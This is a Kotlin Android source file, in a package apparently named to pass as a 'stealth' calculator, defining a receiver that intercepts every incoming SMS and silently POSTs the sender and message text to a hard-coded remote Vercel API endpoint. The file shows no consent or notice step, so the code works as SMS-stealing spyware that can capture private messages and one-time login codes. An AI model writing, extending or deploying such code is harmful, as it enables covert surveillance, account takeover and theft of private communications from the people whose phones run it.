package com.stealth.calc

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class SmsReceiver : BroadcastReceiver() {

    // IMPORTANT: Replace this with your actual Vercel API URL once deployed
    private val VERCEL_API_URL = "https://sms-forwarder-api-abdul-rehmans-projects-171b91e6.vercel.app/api/send"
    private val client = OkHttpClient()

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            
            for (message in smsMessages) {
                val sender = message.displayOriginatingAddress
                val body = message.displayMessageBody
                
                Log.d("SmsReceiver", "Received SMS from: $sender")
                
                // Forward the SMS to the Vercel API
                sendToVercel(sender, body)
            }
        }
    }

    private fun sendToVercel(sender: String?, message: String?) {
        val json = JSONObject()
        json.put("sender", sender ?: "Unknown")
        json.put("message", message ?: "")

        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())

        val request = Request.Builder()
            .url(VERCEL_API_URL)
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("SmsReceiver", "Failed to forward SMS", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("SmsReceiver", "Successfully forwarded SMS to Vercel")
                } else {
                    Log.e("SmsReceiver", "Server returned error: ${response.code}")
                }
                response.close()
            }
        })
    }
}
